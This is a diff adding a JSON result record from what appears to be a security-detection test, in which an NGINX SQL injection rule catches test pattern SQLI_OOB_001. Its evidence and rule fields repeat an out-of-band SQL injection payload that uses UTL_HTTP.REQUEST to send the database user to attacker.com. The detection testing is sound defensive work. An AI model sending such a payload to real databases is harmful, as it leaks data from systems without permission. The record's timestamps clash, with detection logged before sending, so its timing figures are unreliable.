@@ -1,0 +1,17 @@
+{
+  "pattern_id": "SQLI_OOB_001",
+  "test_id": "SQLI_OOB_001-1772113538043-cf8ln",
+  "category": "sqli",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 39000,
+  "evidence": "13:45:38.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1772113538043-cf8ln pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET",
+  "rule_name": "[NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1772113538043-cf8ln pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET",
+  "expected_rule": "[NGINX SQLi] Error-based SQL Injection",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1772113538043-cf8ln pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET",
+  "sent_at": 1772113577000,
+  "detected_at": 1772113538000,
+  "status": "passed"
+}
